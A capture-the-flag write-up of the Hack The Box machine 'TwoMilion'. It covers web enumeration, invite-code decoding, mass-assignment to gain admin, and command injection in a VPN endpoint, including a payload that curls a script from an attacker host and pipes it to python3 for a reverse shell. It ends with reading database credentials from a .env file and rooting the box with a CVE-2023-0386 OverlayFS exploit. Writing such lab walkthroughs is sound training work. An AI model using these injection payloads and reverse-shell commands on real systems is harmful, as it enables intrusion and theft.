---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# TwoMilion

## Enumeration

### Nmap

```
└─$ nmap -sV 10.10.11.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 09:44 EDT
Nmap scan report for 10.10.11.221
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```

HTTP redirects to `2million.htb` so add it to `/etc/hosts`

## Web

There is an `http://2million.htb/invite` which prompts for invite code. By scanning the source code, I can find the interesting `js\inviteapi.min.js` file, containing minified (packed) code. I can unpack it using some JS beutifier like: `https://beautifier.io/`

That yealds this code:

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

Here, the function `makeInviteCode` is the interesting one. Let's call the API.

```
curl -X POST http://2million.htb/api/v1/invite/how/to/generate 
```

I receive:

```
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Nice, but it is encrypted. By a quick glacne, it looks like a substitutional cypher. And yes, ROT13 is. I use CyberChef and the result is:

```
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

Cool, let's call it:

```
curl -X POST http://2million.htb/api/v1/invite/generate
```

The result is:

```
{"0":200,"success":1,"data":{"code":"Uk5ZNzEtTTE4MjctOVNDUkQtTkZOMUk=","format":"encoded"}}
```

Let's try it (but I am worried about the "encoded" there. And of course, it does not work. Let's try cyberchef again. And BOOM. it was Base64 (of course).

```
RNY71-M1827-9SCRD-NFN1I
```

Now I can register (using some temp email).

Ok, I am on the website. By scanning it, I found a page `http://2million.htb/home/access` with a openVPN config to connect to the HTB network. It does not really points anywhere.

## API

There is API, which handles the users, openvpn files, etc. Let's look at it.

Request to `/api/v1` gives away the structure (I had to use a hint for that). Next time enumerate API from the root up.

The interesting endpoint is `/api/v1/admin/settings/update` accepting a PUT request. So let's try to poke around.

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Length: 0
Origin: http://2million.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=u8stnd2hn532sf592q6dp310er
```

Which responds:

```
{"status":"danger","message":"Invalid content type."}
```

Maybe it wants JSON.

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Length: 0
Origin: http://2million.htb
Content-Type: application/json
Cookie: PHPSESSID=u8stnd2hn532sf592q6dp310er
```

```
{"status":"danger","message":"Missing parameter: email"}
```

It does, now to slowly craft the request based on the errors. OK so now.

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Length: 63
Origin: http://2million.htb
Content-Type: application/json
Cookie: PHPSESSID=u8stnd2hn532sf592q6dp310er
{
"email":"smiling.elephant3876@maildrop.cc",
"is_admin":1
}
```

```
{"id":21,"username":"Razzmann","is_admin":1}
```

Gives me admin. So what to do with it.

So, what it allows me is to call `POST /api/v1/admin/vpn/generate`. But I was struggling what to do with it. It generates VPN config for me, or for any other username.

The key was figureout that it is injectable (as it does not makes sense to generate the config for invalid user. So it must be by command). It actually is.

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Length: 36
Origin: http://2million.htb
Content-Type: application/json
Cookie: PHPSESSID=u8stnd2hn532sf592q6dp310er

{
	"username":"Razzmann;whoami;"
}
```

## Getting in

To get reverse shell, I use the python https://github.com/infodox/python-pty-shells.

1. Open server with shells `python3 -m http.server 8888`
2. Open listener `nc -lvnp 7777`
3. Execute the payload (download and execute the shell)

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Length: 84
Origin: http://2million.htb
Content-Type: application/json
Cookie: PHPSESSID=u8stnd2hn532sf592q6dp310er

{
	"username":"Razzmann;curl 10.10.16.33:8888/tcp_pty_backconnect.py | python3;"
}
```

There I scan the folder. There is `Database.php` hinting DB. By going through the code, I notice that the connection string is derived from evironment (form `index.php`). Executing `env` dosent give me anything. I need to look further. Using `ls -la` reveals hidden `.env` file containg the credentials.

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### Database

```
mysql -h localhost -P 3306 -u admin -p htb_prod
# Enter password: SuperDuperPass123
```

There I find table with users.

### User

But it is actually easier than that. There is only one user at `/home` and that is `admin`. Connecting through SSH using the creds actually works.

```
ssh admin@10.10.11.221
# SuperDuperPass123
```

## To ROOT

The machine description gave that away. But still, there are two hints.

1. Check the kernel version `uname -r` for vulnerability
2. Read the mail in `/var/mail/admin` Linpeas will not tell you about it.

The vulnerability exploits the bug in OverlayFS / FUSE which leaks suid from namespace. https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/

There is a PoC available. https://github.com/sxlmnwb/CVE-2023-0386

### PoC compilation

You need following libs to compile it.

```
libfuse-dev
libcap-dev
```

Then just `make all` That will produce three binaries. `fuse`, `gc` and `exp`

### Execution

Copy the binaries to the target and create a folder `ovlcap` Open two terminals, in one call

```
./fuse ./ovlcap/lower ./gc
```

and in the second

```
./exp
```

Now you have root shell in the second one